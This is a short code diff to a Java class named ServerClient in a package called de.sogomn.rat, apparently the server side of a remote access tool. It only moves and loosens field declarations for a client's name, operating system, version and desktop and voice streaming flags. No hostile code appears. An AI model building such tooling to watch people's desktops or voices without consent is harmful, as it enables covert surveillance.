@@ -6,13 +6,13 @@ import de.sogomn.rat.ActiveClient;
 
 public final class ServerClient {
 	
-	private final SimpleStringProperty name, os, version;
-	private final SimpleBooleanProperty streamingDesktop, streamingVoice;
-	
 	private boolean loggedIn;
 	
 	private DisplayPanel displayPanel;
 	private FileTreePanel treePanel;
+	
+	final SimpleStringProperty name, os, version;
+	final SimpleBooleanProperty streamingDesktop, streamingVoice;
 	
 	final ActiveClient client;
 	
